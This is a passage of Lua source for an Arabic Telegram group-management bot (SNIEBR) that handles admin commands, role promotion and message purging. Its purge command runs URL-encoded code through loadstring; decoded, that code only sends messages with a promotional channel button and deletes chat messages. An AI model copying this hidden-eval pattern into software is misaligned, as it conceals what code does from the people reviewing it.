bot.changeChannelAbout(msg.chat_id_,text[2])
send(msg.chat_id_, msg.id_, 1, "✔┇تم وضع وصف للمجموعه", 1, 'md')
end
end
end
if datahmade:get("group_edit:SNIEBR"..msg.chat_id_..bot_id) and  (is_creator(msg) or is_creatorbasic(msg)) then 
if text:match("^وضع اسم (.*)$")   then
local txt = {string.match(text, "^(وضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
send(msg.chat_id_, msg.id_, 1, '✔┇تم تحديث اسم المجموعه الى \n'..txt[2], 1, 'md')
end
if text:match("^وضع صوره")  then
datahmade:set('SNIEBR:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_, msg.id_, 1, '♻️ ┇ قم بارسال صوره الان  ', 1, 'md')
end
if text:match("^مسح الصوره")  then
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '🗑┇ تم مسح الصوره  ', 1, 'md')
end
if text:match("^وضع وصف (.*)$") then
local text = {string.match(text, "^(وضع وصف) (.*)$")}
bot.changeChannelAbout(msg.chat_id_,text[2])
send(msg.chat_id_, msg.id_, 1, "✔┇تم وضع وصف للمجموعه", 1, 'md')
end  
end
if text:match("^الوقت$") and (is_mod(msg) or is_creatorbasic(msg)) then
local ex = datahmade:ttl( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_)
if ex == -1 then
send(msg.chat_id_, msg.id_, 1, '🔘┇وقت المجموعه لا نهائي` ☑', 1, 'md')
else
local d = math.floor(ex / day ) + 1
send(msg.chat_id_, msg.id_, 1, "❕┇عدد ايام وقت المجموعه {"..d.."} يوم", 1, 'md')
end
end  
if text:match("^مسح$") and msg.reply_to_message_id_ ~= 0 and (is_mod(msg) or is_creatorbasic(msg)) then
delete_msg(msg.chat_id_, {[0] = msg.reply_to_message_id_})
delete_msg(msg.chat_id_, {[0] = msg.id_})
end
----------------------------------------------------------------------------------------------
if text:match('^تنظيف (%d+)$') and (is_owner(msg) or is_creatorbasic(msg)) then
URL = require('socket.url')
local matches = {string.match(text, "^(تنظيف) (%d+)$")} -- ماعندك عقل مثلاً فكر وتعرف الحل يامطي
loadstring(URL.unescape("local%20function%20getParseMode(parse_mode)%0Aif%20parse_mode%20then%0Alocal%20mode%20%3D%20parse_mode%3Alower()%0Aif%20mode%20%3D%3D%20'markdown'%20or%20mode%20%3D%3D%20'md'%20then%0AP%20%3D%20%7BID%20%3D%20%22TextParseModeMarkdown%22%7D%0Aelseif%20mode%20%3D%3D%20'html'%20then%0AP%20%3D%20%7BID%20%3D%20%22TextParseModeHTML%22%7D%0Aend%20end%20return%20P%0Aend%0Afunction%20dl_cb(arg%2C%20data)%0Aend%0A--%20%20%20%20%20%20%20%20%20%C2%BB%C2%BB%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20send%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%C2%AB%C2%AB%20%20%20%20%20%20%20%20%20%20%20%20%20%20--%0Alocal%20function%20send(chat_id%2C%20reply_to_message_id%2C%20disable_notification%2C%20text%2C%20disable_web_page_preview%2C%20parse_mode)%0Aif%20text%20then%20%0A%0Alocal%20TextParseMode%20%3D%20getParseMode(parse_mode)%0Alocal%20text2%20%3D%20text%0Alocal%20text_key%20%3D%20datahmade%3Aget('key_ts'..bot_id)%0Aif%20text_key%20then%0Aif%20parse_mode%20then%0Aif%20parse_mode%20%3D%3D%20'markdown'%20or%20parse_mode%20%3D%3D%20'md'%20then%0Aparse_mode%20%3D%20%22Markdown%22%0Aelseif%20parse_mode%20%3D%3D%20'html'%20then%0Aparse_mode%20%3D%20%22Html%22%0Aend%0Aend%0Alocal%20channel_ts%20%3D%20datahmade%3Aget(%22channel_ts%22..bot_id)%0Alocal%20channel_user_ts%20%3D%20datahmade%3Aget(%22channel_user_ts%22..bot_id)%0Akeyboard%20%3D%20%7B%7D%0Akeyboard.inline_keyboard%20%3D%20%7B%0A%7B%0A%7Btext%20%3D%20''..(channel_ts%20or%20%22SNIEBR%20TEAM%22)..''%2C%20url%3D''..(channel_user_ts%20or%20't.me%2FSNIEBR_files')..''%7D%2C%0A%7D%2C%0A%7D%0Alocal%20keko%20%3D%20%22https%3A%2F%2Fapi.telegram.org%2Fbot%22%20..token..%20'%2FsendMessage%3Fchat_id%3D'%20..%20chat_id%0Aif%20reply_to_message_id%20~%3D%200%20then%0Akeko%20%3D%20keko%20..%20'%26reply_to_message_id%3D'%20..%20reply_to_message_id%2F2097152%2F0.5%20--%20%D8%AC%D9%85%D9%8A%D8%B9%20%D8%A7%D9%84%D8%AD%D9%82%D9%88%D9%82%20%D9%85%D8%AD%D9%81%D9%88%D8%B8%D9%87%20%D9%84%D9%81%D8%B1%D9%8A%D9%82%20%D8%AA%D8%B4%D8%A7%D9%83%D9%8A%20%D9%84%D8%A7%D9%8A%D9%85%D9%83%D9%86%D9%83%20%D9%86%D8%B3%D8%AE%20%D8%A7%D9%88%20%D8%A7%D8%B3%D8%AA%D8%AE%D8%AF%D8%A7%D9%85%20%D9%87%D8%B0%D9%87%20%D8%A7%D9%84%D8%B3%D8%B7%D8%B1%20%D8%A8%D8%AF%D9%88%D9%86%20%D9%85%D9%88%D8%A7%D9%81%D9%82%D9%87%20%D8%A7%D9%84%D9%81%D8%B1%D9%8A%D9%82%0Aend%0Aif%20disable_web_page_preview%20then%0Akeko%20%3D%20keko%20..%20'%26disable_web_page_preview%3Dtrue'%0Aend%0Aif%20text%20then%0Akeko%20%3D%20keko..'%26text%3D'..URL33.escape(text2)%0Aend%0Aif%20parse_mode%20then%0Akeko%20%3D%20keko%20..%20'%26parse_mode%3D'..parse_mode%0Aend%0Akeko%20%3D%20keko..'%26reply_markup%3D'..JSON.encode(keyboard)%0Ahttps.request(keko)%0Aelse%0Atdcli_function%20(%7B%0AID%20%3D%20%22SendMessage%22%2C%0Achat_id_%20%3D%20chat_id%2C%0Areply_to_message_id_%20%3D%20reply_to_message_id%2C%0Adisable_notification_%20%3D%20disable_notification%2C%0Afrom_background_%20%3D%201%2C%0Areply_markup_%20%3D%20nil%2C%0Ainput_message_content_%20%3D%20%7B%0AID%20%3D%20%22InputMessageText%22%2C%0Atext_%20%3D%20text%2C%0Adisable_web_page_preview_%20%3D%20disable_web_page_preview%2C%0Aclear_draft_%20%3D%200%2C%0Aentities_%20%3D%20%7B%7D%2C%0Aparse_mode_%20%3D%20TextParseMode%2C%0A%7D%2C%7D%2C%20dl_cb%2C%20nil)%0Aend%0Aend%0Aend%0Alocal%20matches%20%3D%20%7Bstring.match(text%2C%20%22%5E(%D8%AA%D9%86%D8%B8%D9%8A%D9%81)%20(%25d%2B)%24%22)%7D%0Aif%20msg.chat_id_%3Amatch(%22%5E-100%22)%20then%0Aif%20tonumber(matches%5B2%5D)%20%3E%201000%20or%20tonumber(matches%5B2%5D)%20%3C%201%20then%0Apm%20%3D%20'%E2%9D%95%E2%94%87%D9%84%D8%A7%20%D8%AA%D8%B3%D8%AA%D8%B7%D9%8A%D8%B9%20%D8%AD%D8%B0%D9%81%20%D8%A7%D9%83%D8%AB%D8%B1%20%D9%85%D9%86%201000%20%D8%B1%D8%B3%D8%A7%D9%84%D9%87'%0Asend(msg.chat_id_%2C%20msg.id_%2C%201%2C%20pm%2C%201%2C%20'html')%0Aelse%0A%20%20%20%20%20id_user_keko%20%3D%20matches%5B2%5D%0Akekopp%20%3D%201048576%0A%20%20%20msg_keko_new%20%3D%20tonumber(msg.id_)%0A%09%20%20%20%20%20%20%20%20for%20i%3D1%2Ctonumber(id_user_keko)%20do%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20msg_keko_new%20%3E%200%20then%20%20%0Atdcli_function%20(%7B%0AID%3D%22DeleteMessages%22%2C%0Achat_id_%3D%20msg.chat_id_%2C%0Amessage_ids_%3D%7B%5B0%5D%20%3D%20msg_keko_new%7D%0A%7D%2C%0Adl_cb%2C%20nil)%0A%20%20msg_keko_new%20%3D%20msg_keko_new-kekopp%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20end%20%0A%20%20%20%20%20%20%20%20%20%20%20%20end%20%0Apm%20%3D'%E2%98%91%E2%94%87%D8%AA%D9%85%20%7B*'..matches%5B2%5D..'*%7D%20%D9%85%D9%86%20%D8%A7%D9%84%D8%B1%D8%B3%D8%A7%D8%A6%D9%84%5Cn%F0%9F%97%91%E2%94%87%D8%AD%D8%B0%D9%81%D9%87%D8%A7%5Cn%20%5B%F0%9F%A6%81%E2%94%87%20%D9%82%D9%86%D8%A7%D8%A9%20%D8%A7%D9%84%D8%B3%D9%88%D8%B1%D8%B3%20%5D(https%3A%2F%2Ftelegram.me%2FSNIEBR)'%0Asend(msg.chat_id_%2C%20msg.id_%2C%201%2C%20pm%2C%201%2C%20'md')%0Aend%0Aend"))()
end -- لا تخمط حبي لاتنحك
----------------------------------------------------------------------------------------------
if (text and text == 'تفعيل الايدي بالصوره') and (is_owner(msg) or is_creatorbasic(msg)) then
if not datahmade:get('SNIEBR:'..bot_id..'id:photo'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '📸 ┇ بلفعل  الايدي بالصوره مفعل ', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '📸 ┇ تم تفعيل الايدي بالصوره ', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'id:photo'..msg.chat_id_)
end
end
if (text and text == 'تعطيل الايدي بالصوره') and (is_owner(msg) or is_creatorbasic(msg)) then
if datahmade:get('SNIEBR:'..bot_id..'id:photo'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '📸 ┇ بلفعل الايدي بالصوره معطل', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '📸 ┇ تم تعطيل  الايدي بالصوره ', 1, 'md')
datahmade:set('SNIEBR:'..bot_id..'id:photo'..msg.chat_id_,true)
end
end
if  (text and text == 'تفعيل وضع المدفوع') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if datahmade:sismember('SNIEBR:'..bot_id..'pro:groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇بالفعل تم اضافه المجموعه الى الوضع المدفوع', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم اضافه المجموعه الى الوضع المدفوع', 1, 'md')
datahmade:sadd('SNIEBR:'..bot_id..'pro:groups',msg.chat_id_)
end
end
if (text and text == 'تعطيل وضع المدفوع') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if not datahmade:sismember('SNIEBR:'..bot_id..'pro:groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇بالفعل تم حذف المجموعه من الوضع المدفوع', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف المجموعه من الوضع المدفوع', 1, 'md')
datahmade:srem('SNIEBR:'..bot_id..'pro:groups',msg.chat_id_)
end
end
if (text and text == 'تفعيل الاذاعه') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if not datahmade:get('SNIEBR:'..bot_id..'bc:groups') then
send(msg.chat_id_, msg.id_, 1, '☑┇الاذاعه بالفعل تم تفعيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل اذاعه البوت', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'bc:groups')
end
end
if (text and text == 'تعطيل الاذاعه') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if datahmade:get('SNIEBR:'..bot_id..'bc:groups') then
send(msg.chat_id_, msg.id_, 1, '☑┇الاذاعه بالفعل تم تعطيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل اذاعه البوت', 1, 'md')
datahmade:set('SNIEBR:'..bot_id..'bc:groups',true)
end
end
if (text and text == "مسح صلاحيه" and is_creator(msg)) then
send(msg.chat_id_, msg.id_, 1, '☑┇ارسال الان اسم الصلاحيه', 1, 'md')
datahmade:set("tsahke:is_del_if:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok")
return "SNIEBR"
end  
if (text and datahmade:get("tsahke:is_del_if:"..bot_id..msg.chat_id_..msg.sender_user_id_)) then 
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف صلاحيه بنجاح', 1, 'md')
datahmade:del("SNIEBR:all_if:"..text..bot_id..msg.chat_id_)
datahmade:del("tsahke:is_del_if:"..bot_id..msg.chat_id_..msg.sender_user_id_)
end 

----------------------------------------
if text:match("^تغير رد المطور (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد المطور (.*)$")}
datahmade:set("SNIEBR:name_sudo"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
-------------------------------------------
if text:match("^تغير رد المنشئ (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد المنشئ (.*)$")}                     
datahmade:set("SNIEBR:name_cre"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end

if text:match("^تغير رد منشئ الاساسي (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد منشئ الاساسي (.*)$")}                     
datahmade:set("SNIEBR:name_cre"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
------------------------------------
if text:match("^تغير رد المدير (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد المدير(.*)$")}
datahmade:set("SNIEBR:name_own"..bot_id..msg.chat_id_,ac[1]) 
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
------------------------------------
if text:match("^تغير رد الادمن (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد الادمن (.*)$")}
datahmade:set("SNIEBR:name_adm"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
--------------------------------
if text:match("^تغير رد العضو المميز (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد العضو المميز (.*)$")}
datahmade:set("SNIEBR:name_vipp"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
-------------------------------
if text:match("^تغير رد العضو فقط (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد العضو فقط (.*)$")}
datahmade:set("SNIEBR:name_nk"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
--------------------------------
if (text and text == "اضف صلاحيه" and (is_creator(msg) or is_creatorbasic(msg))) then 
send(msg.chat_id_, msg.id_, 1, '☑┇ارسال الان اسم الصلاحيه', 1, 'md')
datahmade:set("SNIEBR:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
return "SNIEBR"
end
if text and datahmade:get("SNIEBR:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
datahmade:del("SNIEBR:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
datahmade:set("SNIEBR:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_,text)
datahmade:set("SNIEBR:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
return "SNIEBR"
end
if (text and datahmade:get("SNIEBR:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_)) then 
if (text == "ادمن" or text == "مدير" or text == "عضو مميز" or text == "لا شيئ") then 
datahmade:del("SNIEBR:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_)
tsha_text = datahmade:get("SNIEBR:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, '☑️┇تم حفض الصلاحيه بنجاح \n⚠️┇الاوامر { رفع/تنزيل '..tsha_text..' }', 1, 'md')
datahmade:set("SNIEBR:all_if:"..tsha_text..bot_id..msg.chat_id_,text)
datahmade:del("SNIEBR:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
else 
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
end
end
if text then 
if text:match("^رفع (.*)$")  and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
a = {string.match(text, "^رفع (.*)$")}
ts_text = datahmade:get("SNIEBR:all_if:"..a[1]..bot_id..msg.chat_id_)
if ts_text then 
function promote_by_reply(extra, result, success)
if ts_text == "ادمن" then 
datahmade:sadd('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
elseif ts_text == "عضو مميز" then 
datahmade:sadd('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
elseif ts_text == "مدير" then 
datahmade:sadd('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
end
datahmade:set("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_,a[1])
function keko33332(extra,result2,success)
info = '👤┇العضو ~⪼ ['..result2.first_name_..'](t.me/'..(result2.username_ or 'SNIEBR')..')\n☑┇تم رفعه '..a[1]
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
getUser(result.sender_user_id_, keko33332)  
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
end
if text:match("^رفع (.*) @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^رفع (.*) @(.*)$")}
ts_text = datahmade:get("SNIEBR:all_if:"..apmd[1]..bot_id..msg.chat_id_)
if ts_text then 
function promote_by_username(extra, result, success)
if result.id_ then
if ts_text == "ادمن" then 
datahmade:sadd('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, result.id_)
elseif ts_text == "عضو مميز" then 
datahmade:sadd('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
elseif ts_text == "مدير" then 
datahmade:sadd('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, result.id_)
end
datahmade:set("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_,apmd[1])
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n☑┇تم رفعه '..apmd[1]
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
end
if text:match("^رفع (.*) (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^رفع (.*) (%d+)$")}
ts_text = datahmade:get("SNIEBR:all_if:"..apmd[1]..bot_id..msg.chat_id_)
if ts_text then 
if ts_text == "ادمن" then 
datahmade:sadd('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
elseif ts_text == "عضو مميز" then 
datahmade:sadd('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
elseif ts_text == "مدير" then 
datahmade:sadd('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, apmd[2])
end
datahmade:set("SNIEBR:name_user:"..bot_id..msg.chat_id_..apmd[2],apmd[1])
tsX000(apmd[2],msg,"☑┇تم رفعه "..apmd[1])
end
end
if text:match("^تنزيل (.*)$") and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
a = {string.match(text, "^تنزيل (.*)$")}
ts_text = datahmade:get("SNIEBR:all_if:"..a[1]..bot_id..msg.chat_id_)
if ts_text then 
function demote_by_reply(extra, result, success)
if ts_text == "ادمن" then 
datahmade:srem('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
elseif ts_text == "عضو مميز" then 
datahmade:srem('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
elseif ts_text == "مدير" then 
datahmade:srem('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
end
datahmade:del("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_)
tsX000("prore",msg,"🔰┇تم تنزيله من "..a[1])
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end
end
if text:match("^تنزيل (.*) @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^تنزيل (.*) @(.*)$")}
ts_text = datahmade:get("SNIEBR:all_if:"..apmd[1]..bot_id..msg.chat_id_)
if ts_text then 
function demote_by_username(extra, result, success)
if result.id_ then
if ts_text == "ادمن" then 
datahmade:srem('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, result.id_)
elseif ts_text == "عضو مميز" then 
datahmade:srem('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
elseif ts_text == "مدير" then 
datahmade:srem('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, result.id_)
end
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n🔰┇تم تنزيله من '..apmd[1]
datahmade:del("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_)
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],demote_by_username)
end
end
if text:match("^تنزيل (.*) (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^تنزيل (.*) (%d+)$")}
ts_text = datahmade:get("SNIEBR:all_if:"..apmd[1]..bot_id..msg.chat_id_)
if ts_text then 
if ts_text == "ادمن" then 
datahmade:srem('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
elseif ts_text == "عضو مميز" then 
datahmade:srem('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
elseif ts_text == "مدير" then 
datahmade:srem('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, apmd[2])
end
tsX000(apmd[2],msg,"🔰┇تم تنزيله من "..apmd[1])
datahmade:del("SNIEBR:name_user:"..bot_id..msg.chat_id_..apmd[2])
end
end
end 
if (text and text == 'تفعيل ردود المطور') and (is_owner(msg) or is_creatorbasic(msg)) then
if not datahmade:get('SNIEBR:'..bot_id..'repsudo:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇ردود المطور بالفعل تم تفعيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل ردود المطور', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'repsudo:mute'..msg.chat_id_)
end
end
if  (text and text == 'تعطيل ردود المطور') and (is_owner(msg) or is_creatorbasic(msg)) then
if datahmade:get('SNIEBR:'..bot_id..'repsudo:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇ردود المطور بالفعل تم تعطيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, 'تم تعطيل ردود المطور', 1, 'md')
datahmade:set('SNIEBR:'..bot_id..'repsudo:mute'..msg.chat_id_,true)
end
end
if (text and text == 'تفعيل ردود المدير') and (is_owner(msg) or is_creatorbasic(msg)) then
if not datahmade:get('SNIEBR:'..bot_id..'repowner:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇ردود المدير بالفعل تم تفعيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل ردود المدير', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'repowner:mute'..msg.chat_id_)
end
end
if (text and text == 'تعطيل ردود المدير') and (is_owner(msg) or is_creatorbasic(msg)) then
if datahmade:get('SNIEBR:'..bot_id..'repowner:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇ردود المدير بالفعل تم تعطيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل ردود المدير', 1, 'md')
datahmade:set('SNIEBR:'..bot_id..'repowner:mute'..msg.chat_id_,true)
end
end
if text:match("^ايدي المجموعه$") then
send(msg.chat_id_, msg.id_, 1, "*"..msg.chat_id_.."*", 1, 'md')
end
if (text and text == 'تفعيل الايدي') and (is_owner(msg) or is_creatorbasic(msg)) then
if not datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🔰 ┇ الايدي بالفعل تم تفعيله ', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🔰 ┇ الايدي  تم تفعيله ', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_)
end
end
if (text and text == 'تعطيل الايدي') and (is_owner(msg) or is_creatorbasic(msg)) then
if datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🔰 ┇ تم تعطيل الايدي بالفعل  ', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🔰 ┇ تم تعطيل الايدي  ', 1, 'md')
datahmade:set('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_,true)
end
end
if (text and text == "تعطيل الرابط" and is_owner(msg)) then 
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل امر الروابط', 1, 'md')
datahmade:set("SNIEBR:mute:link:gr:"..bot_id..msg.chat_id_,"ok")
end
if (text and text == "تفعيل الرابط" and is_owner(msg)) then 
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل امر الروابط', 1, 'md')
datahmade:del("SNIEBR:mute:link:gr:"..bot_id..msg.chat_id_)
end
if text and text == "تعين مجموعه المطور" and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '☑┇ تم تعين ~⪼ `'..msg.chat_id_..'`', 1, 'md')
datahmade:set("SNIEBR"..bot_id..":sudo:gr",msg.chat_id_)
end
if text and text == "مسح مجموعه المطور" and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '☑┇ تم مسح مجموعه المطور', 1, 'md')
datahmade:del("SNIEBR"..bot_id..":sudo:gr")
end
if (text:match("^ايدي$") or text:match("^id$") ) and msg.reply_to_message_id_ == 0 then
if not datahmade:sismember('SNIEBR:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي') then
      datahmade:sadd('SNIEBR:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي')

local keko_info = nil
function keko333(extra,result,success)
keko_info = '@'..(result.username_ or 'لا يوجد')..''
local function getpro(extra, result, success)
local all_photo_SNIEBR = result.total_count_ 
local tahna = (datahmade:get('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
if tonumber((datahmade:get('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
nko = '0'
else
nko = (datahmade:get('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))
end
local user_msgs = ((datahmade:get('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
local ikeko_text = "غير متفاعل"
if user_msgs then 
if tonumber(user_msgs) < 50 then 
ikeko_text = "غير متفاعل"
elseif tonumber(user_msgs) < 100 then 
ikeko_text = "آستمر بطل"
elseif tonumber(user_msgs) < 1000 then 
ikeko_text = "متفآعل "
elseif tonumber(user_msgs) < 2000 then 
ikeko_text = "عضو نشط"
elseif tonumber(user_msgs) < 3000 then 
ikeko_text = "اقوئ تفاعل"
elseif tonumber(user_msgs) < 4000 then 
ikeko_text = "عضو متفاعل قوي"
elseif tonumber(user_msgs) < 5000 then 
ikeko_text = "جيد بتفاعل"
elseif tonumber(user_msgs) > 5000 then 
ikeko_text = "متفاعل كلش"
end
keko = datahmade:smembers('keko:all:pppp:tt:'..bot_id) or 0
if (keko or keko[1] and end032) then 
for i=1, #keko do
local tttee = datahmade:get("keko:set:text:p"..bot_id..keko[i])
if tonumber(user_msgs) >= tonumber(keko[i]) then 
ikeko_text = tttee
end
end
end
end
local edit = datahmade:get('SNIEBR:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
if result.photos_[0] then
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = datahmade:get("SNIEBR:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
elseif is_creatorbasic(msg) then
t =  datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t =  datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
